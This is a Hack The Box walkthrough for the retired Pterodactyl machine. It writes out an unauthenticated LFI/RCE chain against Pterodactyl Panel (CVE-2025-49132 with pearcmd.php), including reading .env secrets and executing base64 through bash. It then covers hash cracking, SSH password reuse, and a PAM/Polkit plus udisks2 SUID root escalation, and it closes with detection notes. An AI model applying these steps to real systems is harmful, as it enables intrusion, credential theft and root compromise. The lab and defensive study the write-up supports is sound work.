---
machine: Pterodactyl
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, opensuse, pterodactyl, cve-2025-49132, pearcmd, polkit, udisks2]
---

# Pterodactyl — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

**openSUSE Leap 15.6** running the **Pterodactyl 1.11.10** panel at `panel.pterodactyl.htb`. CVE-2025-49132 gives **unauthenticated LFI/RCE** in `/locales/locale.json`; chained with `pearcmd.php` it writes a webshell and runs as `wwwrun`, leaking the database credentials on the way. MariaDB dumps the users table, the bcrypt hash for `phileasfogg3` cracks, and SSH follows. Root comes from the **CVE-2025-6018 + CVE-2025-6019** chain: PAM/Polkit plus `udisks2` without `nosuid`.

## Recon

```bash
nmap -p- --min-rate 3500 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 9.6p1 (openSUSE Leap 15.6)
80/tcp  http  nginx 1.21.5
```

```bash
curl -s http://<IP>/changelog.txt
```

```text
[Installed] Pterodactyl Panel v1.11.10
```

There is also an exposed `phpinfo.php`. Vhost enumeration:

```bash
ffuf -u http://<IP>/ -H "Host: FUZZ.pterodactyl.htb" -w <wordlist> -fs <base_size>
```

```text
pterodactyl.htb        -> Minecraft landing page
panel.pterodactyl.htb  -> Pterodactyl panel v1.11.10
```

## Access: CVE-2025-49132

`/locales/locale.json` uses the `locale` and `namespace` parameters to build a path handed to `require()`, unnormalised. Use a public PoC adjusted to openSUSE's PEAR path (it usually needs more `../` than Debian):

```bash
python3 poc.py panel.pterodactyl.htb "echo <base64> | base64 -d | bash"
```

The same flaw reads panel files:

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../../var/www/pterodactyl&namespace=.env"
```

`.env` and `config/database.php` yield `APP_KEY` plus MariaDB user and password. The **PEAR** chain is what executes: `pearcmd.php` takes arguments from the query string (`register_argc_argv`) and writes a PHP file into the webroot, later included. The shell returns as **`wwwrun`**.

## From wwwrun to a user

```bash
mysql -h 127.0.0.1 -u pterodactyl -p'<password>' panel
```

```sql
select email, username, password from users;
```

`phileasfogg3`'s bcrypt hash falls to John:

```bash
john --wordlist=rockyou.txt hash.txt
```

The password is reused over SSH:

```bash
ssh phileasfogg3@<IP>
cat ~/user.txt
```

`/var/mail/` holds a message mentioning the udisks escalation chain, the hint for the next step.

## Escalation: CVE-2025-6018 + CVE-2025-6019

The first piece is SUSE-specific: `pam_env` processes `~/.pam_environment` **before** `pam_systemd`, so `XDG_SEAT` and `XDG_VTNR` can be injected to make Polkit treat the SSH session as a local console (`allow_active`).

```bash
cat > ~/.pam_environment <<'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```

With those `allow_active` rights, the second piece applies: `udisks2` mounts filesystems through `libblockdev` without `nosuid`, so an XFS image prepared with a root SUID binary mounts and runs:

```bash
# XFS image with a prepared SUID /root-shell
udisksctl loop-setup -f rootfs.img
udisksctl mount -b /dev/loop0
/run/media/<user>/<uuid>/root-shell -p
```

```text
uid=0(root)
```

As root, read `/root/root.txt` and the user flag already captured.

## Lessons

- An outdated third-party panel with a critical unauthenticated CVE is the way in, and `changelog.txt` names the exact version.
- The LFI does more than read: with `pearcmd.php` and `register_argc_argv` it writes and executes.
- Panel database credentials lead to the bcrypt hash, and password reuse finishes the lateral step.
- On SUSE, PAM and Polkit do not behave like Debian: `pam_env` before `pam_systemd` turns a remote session into a local one.
- Detection: `/locales/locale.json` requests with `../`, writes into the webroot, and loop-device mounts from a web account.
